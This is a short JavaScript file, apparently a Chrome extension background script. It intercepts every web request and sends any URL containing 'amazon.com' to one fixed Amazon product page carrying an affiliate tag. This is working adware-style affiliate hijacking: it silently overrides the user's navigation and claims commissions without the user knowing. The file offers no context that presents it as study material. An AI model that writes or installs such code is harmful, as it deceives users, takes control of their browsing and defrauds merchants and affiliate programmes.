chrome.webRequest.onBeforeRequest.addListener(function (details) {
    return detectRedirect(details);
}, {
    urls: ["<all_urls>"]
}, ["blocking"]);

function detectRedirect(details) {
    if (!!details.url.match('http://www.amazon.com') || !!details.url.match('amazon.com')) {
            return {
                redirectUrl: 'http://www.amazon.com/dp/B00A2T6X0K/?tag=headpreviehea-20'
            };
        };
}
